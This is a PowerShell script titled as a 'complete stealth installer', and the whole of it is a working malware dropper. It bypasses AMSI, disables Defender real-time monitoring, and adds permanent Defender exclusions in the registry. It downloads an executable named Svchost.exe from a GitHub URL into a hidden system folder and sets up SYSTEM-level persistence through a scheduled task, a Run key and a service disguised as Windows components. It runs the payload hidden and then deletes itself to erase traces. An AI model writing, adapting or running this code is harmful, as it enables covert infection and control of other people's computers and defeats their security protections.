# ============================================
# COMPLETE STEALTH INSTALLER
# ============================================

# ============================================
# STAGE 1: AMSI BYPASS (Silent)
# ============================================
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# ============================================
# STAGE 2: DEFENDER TEMPORARY OFF (20 Seconds)
# ============================================
# Add exclusions first (so Defender ignores us later)
Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue

# Disable Real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# ============================================
# STAGE 3: CREATE HIDDEN FOLDER + RANDOM NAME
# ============================================
$HiddenFolder = "$env:ProgramData\Microsoft\Windows\Drivers"
if (!(Test-Path $HiddenFolder)) {
    New-Item -ItemType Directory -Path $HiddenFolder -Force | Out-Null
}
Set-ItemProperty -Path $HiddenFolder -Name Attributes -Value "Hidden, System"

$RandomName = [System.Guid]::NewGuid().ToString().Substring(0, 12) + ".exe"
$ExePath = Join-Path $HiddenFolder $RandomName

# ============================================
# STAGE 4: DOWNLOAD EXE
# ============================================
$DownloadUrl = "https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe"
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
    $webClient.DownloadFile($DownloadUrl, $ExePath)
} catch {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $ExePath -UseBasicParsing
}

# ============================================
# STAGE 5: ADD PERMANENT DEFENDER EXCLUSIONS
# ============================================
# Registry exclusions (survives reboot)
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
Set-ItemProperty -Path $regPath -Name $HiddenFolder -Value 0 -Type DWord -Force

$regProcPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"
if (!(Test-Path $regProcPath)) { New-Item -Path $regProcPath -Force | Out-Null }
Set-ItemProperty -Path $regProcPath -Name $RandomName -Value 0 -Type DWord -Force

# ============================================
# STAGE 6: HIDE THE EXE FILE
# ============================================
Set-ItemProperty -Path $ExePath -Name Attributes -Value "Hidden, System"

# ============================================
# STAGE 7: AUTO-START (HIGHEST PRIVILEGE)
# ============================================
# Method 1: Scheduled Task (SYSTEM level)
$action = New-ScheduledTaskAction -Execute $ExePath
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -Compatibility Win8
$taskName = "WindowsUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force | Out-Null

# Method 2: Registry Run (backup)
$regRun = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regName = "SysUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
Set-ItemProperty -Path $regRun -Name $regName -Value $ExePath -Force

# Method 3: Windows Service (most persistent)
$serviceName = "WinDriver_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
sc.exe create $serviceName binPath= $ExePath start= auto obj= LocalSystem > $null
sc.exe description $serviceName "Windows Driver Foundation" > $null

# ============================================
# STAGE 8: START THE EXE
# ============================================
Start-Process -FilePath $ExePath -WindowStyle Hidden

# ============================================
# STAGE 9: WAIT 20 SECONDS THEN RE-ENABLE DEFENDER
# ============================================
Start-Sleep -Seconds 20

# Re-enable Defender (but exclusions remain!)
try {
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
} catch {}

# ============================================
# STAGE 10: CLEANUP - DELETE SCRIPT ITSELF
# ============================================
try {
    $scriptPath = $MyInvocation.MyCommand.Path
    if (Test-Path $scriptPath) {
        Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
    }
} catch {}

# ============================================
# DONE - NO TRACES LEFT
# ============================================
